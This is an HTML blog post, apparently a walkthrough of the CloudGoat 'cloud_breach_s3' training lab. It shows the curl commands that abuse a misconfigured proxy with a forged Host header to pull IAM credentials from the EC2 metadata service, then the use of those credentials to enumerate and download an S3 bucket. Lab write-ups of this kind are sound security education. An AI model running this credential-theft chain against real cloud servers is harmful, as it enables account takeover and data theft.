@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Cloud Breach S3 - CloudGoat WalkthroughThis walkthrough demonstrates a complete penetration test of the CloudGoat “cloud_breach_s3” scenario, showcasing how attackers can exploit misconfigured AWS EC2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CloudGoat-Cloud_Breach_S3">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Cloud Breach S3 - CloudGoat WalkthroughThis walkthrough demonstrates a complete penetration test of the CloudGoat “cloud_breach_s3” scenario, showcasing how attackers can exploit misconfigured AWS EC2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cloud_Breach_S3/s3_bucket.png">
+<meta property="article:published_time" content="2025-06-02T13:27:31.000Z">
+<meta property="article:modified_time" content="2025-06-02T10:28:39.087Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="AWS">
+<meta property="article:tag" content="CloudGoat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Cloud_Breach_S3/s3_bucket.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>CloudGoat-Cloud_Breach_S3</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/02/CloudGoat-Vulnerable-Lambda/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&text=CloudGoat-Cloud_Breach_S3"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&is_video=false&description=CloudGoat-Cloud_Breach_S3"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CloudGoat-Cloud_Breach_S3&body=Check out this article: https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&name=CloudGoat-Cloud_Breach_S3&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&t=CloudGoat-Cloud_Breach_S3"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cloud-Breach-S3-CloudGoat-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Cloud Breach S3 - CloudGoat Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance-Phase"><span class="toc-number">1.2.</span> <span class="toc-text">Reconnaissance Phase</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-EC2-Metadata-Service"><span class="toc-number">1.3.</span> <span class="toc-text">Exploiting the EC2 Metadata Service</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AWS-Configuration-and-Enumeration"><span class="toc-number">1.4.</span> <span class="toc-text">AWS Configuration and Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Using-CloudTap-for-Advanced-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Using CloudTap for Advanced Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.6.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CloudGoat-Cloud_Breach_S3
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-02T13:27:31.000Z" class="dt-published" itemprop="datePublished">2025-06-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AWS/" rel="tag">AWS</a>, <a class="p-category" href="/tags/CloudGoat/" rel="tag">CloudGoat</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Cloud-Breach-S3-CloudGoat-Walkthrough"><a href="#Cloud-Breach-S3-CloudGoat-Walkthrough" class="headerlink" title="Cloud Breach S3 - CloudGoat Walkthrough"></a>Cloud Breach S3 - CloudGoat Walkthrough</h1><p>This walkthrough demonstrates a complete penetration test of the CloudGoat “cloud_breach_s3” scenario, showcasing how attackers can exploit misconfigured AWS EC2 instances to access sensitive S3 data. The scenario involves exploiting an EC2 metadata service proxy to retrieve IAM credentials and subsequently accessing restricted S3 buckets containing sensitive information. This CloudGoat walkthrough covers essential AWS security concepts including EC2 metadata service abuse, IAM credential extraction, and S3 bucket enumeration using automated tools like CloudTap.</p>
+<h2 id="Initial-Setup"><a href="#Initial-Setup" class="headerlink" title="Initial Setup"></a>Initial Setup</h2><p>Starting CloudGoat, first we should whitelist our IP:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure>
+
+<p>Then run the following command to create the scenario:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create cloud_breach_s3</span><br></pre></td></tr></table></figure>
+
+<p>We get our initial information:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat_output_aws_account_id = 065855168369</span><br><span class="line">cloudgoat_output_target_ec2_server_ip = 54.224.25.16</span><br></pre></td></tr></table></figure>
+
+<h2 id="Reconnaissance-Phase"><a href="#Reconnaissance-Phase" class="headerlink" title="Reconnaissance Phase"></a>Reconnaissance Phase</h2><p>Let’s start scanning the machine and see what ports are open:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sC -sV --top-ports=1000 54.224.25.16</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 30:20:b0:04:5a:56:28:9f:91:04:ad:3d:37:9f:64:77 (RSA)</span><br><span class="line">|   256 ee:41:41:e5:55:9e:d9:39:fa:5b:53:b0:91:5f:ba:88 (ECDSA)</span><br><span class="line">|_  256 d2:72:c2:f7:4b:1e:ca:05:16:96:3f:58:8d:ba:49:c6 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (application/octet-stream).</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>There are two ports open <code>22</code> and <code>80</code>. Let’s see what’s hosted on port 80 first:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://54.224.25.16/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This server is configured to proxy requests to the EC2 metadata service. Please modify your request&#x27;s &#x27;host&#x27; header and try again.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploiting-the-EC2-Metadata-Service"><a href="#Exploiting-the-EC2-Metadata-Service" class="headerlink" title="Exploiting the EC2 Metadata Service"></a>Exploiting the EC2 Metadata Service</h2><p>The <strong>AWS EC2 metadata service</strong> is accessible via <code>http://169.254.169.254/latest/meta-data/</code>.<br>Our goal is to <strong>abuse the proxy</strong> to retrieve metadata — possibly credentials or a flag stored in a user data script or IAM role credentials.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Host: 169.254.169.254&quot;</span> http://54.224.25.16/latest/meta-data/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ami-id</span><br><span class="line">ami-launch-index</span><br><span class="line">ami-manifest-path</span><br><span class="line">block-device-mapping/</span><br><span class="line">events/</span><br><span class="line">hibernation/</span><br><span class="line">hostname</span><br><span class="line">iam/</span><br><span class="line">identity-credentials/</span><br><span class="line">instance-action</span><br><span class="line">instance-id</span><br><span class="line">instance-life-cycle</span><br><span class="line">instance-type</span><br><span class="line">local-hostname</span><br><span class="line">local-ipv4</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>Now we can access the IAM folder and find the stored credentials:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Host: 169.254.169.254&quot;</span> http://54.224.25.16/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgid1w9fw6k41a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Code&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Success&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;LastUpdated&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2025-06-02T09:47:46Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS-HMAC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AccessKeyId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ASIAQ6VK#########&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SecretAccessKey&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;vGwJXq/#######################&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Token&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;IQoJb3JpZ2luX2VjECIaCXVzLWVhc3QtMSJIMEYCIQDnHxLZZg2tjMuc1oMRPE5kEbDx1fSXkdgj10uIAdNIZQIhAJNEadIM5+DJO0NlSYWxKOHhlz6TBzFEU9un5lC5Jy9mKsQFCOv//////////wEQABoMMDY1ODU1MTY4MzY5IgxedGWksHmqogwnwUkqmAWHWHPsZcUKi5u0H5qmE46MBnVourgix480tzyAEv1EfaKIbsNzdkyaTsYYzL++JUCN0agA0OE9nhmqAnQ41axHY0twbEKS0HMQhEzM/+47qvnGbvogAChpZkZrXmN1Kdz+l45LpovVvykejrdWgwQC1LPYUNQSYdWBrnbFpPmXEWV2N6WjZJyNT0AeNFiSRz5ROcFQw1BQsMF1j1dhDLDu6BbINBZpdIV4Ef7ggDYvY2J3q1K+pFXOcnR+0aHOiFi6UlPYnOTpQXVMBH4+I9WaCmX90+xN/W3b0gGhdnLPUy1LO#############################&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Expiration&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2025-06-02T16:22:23Z&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="AWS-Configuration-and-Enumeration"><a href="#AWS-Configuration-and-Enumeration" class="headerlink" title="AWS Configuration and Enumeration"></a>AWS Configuration and Enumeration</h2><p>First we need to configure the credentials and the aws_session_token:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile init</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure <span class="built_in">set</span> aws_session_token <span class="string">&quot;&lt;TOKEN&gt;&quot;</span> --profile init</span><br></pre></td></tr></table></figure>
+
+<h2 id="Using-CloudTap-for-Advanced-Enumeration"><a href="#Using-CloudTap-for-Advanced-Enumeration" class="headerlink" title="Using CloudTap for Advanced Enumeration"></a>Using CloudTap for Advanced Enumeration</h2><p>I will be using <a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> to enumerate all of the permissions the user we obtained has. CloudTap is a powerful AWS enumeration tool that automatically discovers and exploits AWS permissions, making it invaluable for penetration testing and security assessments.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys init</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Cloud_Breach_S3/s3_bucket.png" alt="S3 Bucket Discovery"></p>
+<p>The CloudTap tool has found an S3 bucket and automatically downloads it. Inside there is sensitive information about credit card numbers and IP addresses, which marks the end of this engagement.</p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This CloudGoat walkthrough demonstrated a complete attack chain from initial reconnaissance to sensitive data exfiltration. The key vulnerabilities exploited were:</p>
+<ol>
+<li><strong>Misconfigured EC2 proxy</strong> allowing access to metadata service</li>
+<li><strong>Exposed IAM credentials</strong> through metadata service</li>
+<li><strong>Overprivileged S3 access</strong> leading to sensitive data exposure</li>
+</ol>
+<p>Tools like CloudTap significantly streamline the AWS enumeration process, automatically discovering and exploiting permissions that manual testing might miss. This scenario highlights the critical importance of properly securing EC2 metadata services and implementing least-privilege IAM policies in AWS environments.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cloud-Breach-S3-CloudGoat-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Cloud Breach S3 - CloudGoat Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance-Phase"><span class="toc-number">1.2.</span> <span class="toc-text">Reconnaissance Phase</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-EC2-Metadata-Service"><span class="toc-number">1.3.</span> <span class="toc-text">Exploiting the EC2 Metadata Service</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AWS-Configuration-and-Enumeration"><span class="toc-number">1.4.</span> <span class="toc-text">AWS Configuration and Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Using-CloudTap-for-Advanced-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Using CloudTap for Advanced Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.6.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&text=CloudGoat-Cloud_Breach_S3"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&is_video=false&description=CloudGoat-Cloud_Breach_S3"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CloudGoat-Cloud_Breach_S3&body=Check out this article: https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&title=CloudGoat-Cloud_Breach_S3"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&name=CloudGoat-Cloud_Breach_S3&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/02/CloudGoat-Cloud-Breach-S3/&t=CloudGoat-Cloud_Breach_S3"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
